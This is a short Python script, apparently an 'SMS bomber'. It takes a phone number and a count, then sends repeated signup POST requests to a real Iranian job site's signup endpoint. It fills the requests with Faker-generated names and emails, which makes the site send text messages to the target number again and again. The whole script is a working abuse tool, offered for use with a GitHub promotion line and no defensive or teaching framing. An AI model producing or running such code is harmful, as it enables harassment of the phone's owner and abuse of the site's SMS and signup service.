# import module
import sys
import requests
from colorama import Fore
from faker import Faker

fake_username = Faker()

# inputs
phone_input = input(Fore.GREEN + 'Enter your phone number:\n\n:>>')
many_input = input(Fore.RED + f'How man time do you want send sms to {phone_input}:  ')

# Request and post
url = 'https://alloestekhdam.com/User/userSignupStepOne'
q_username = fake_username.name().split()
q2_username = ''.join(q_username)
q_email = fake_username.email().split()
q2_email = ''.join(q_email)
data = {'userEmail': q2_email, 'userMobileNo': phone_input, 'userName': q2_username}

counter = 0


while counter < int(many_input):
    try:
        req = requests.post(url, data=data)
        print(Fore.YELLOW+ 'Sent!!! ')
    except:
        print(Fore.RED + "Something is wrong")
        sys.exit()

    counter += 1



print(Fore.BLUE+ 'Process is finished!!! \n follow me on github :) \n https://github.com/MehrasDreams')
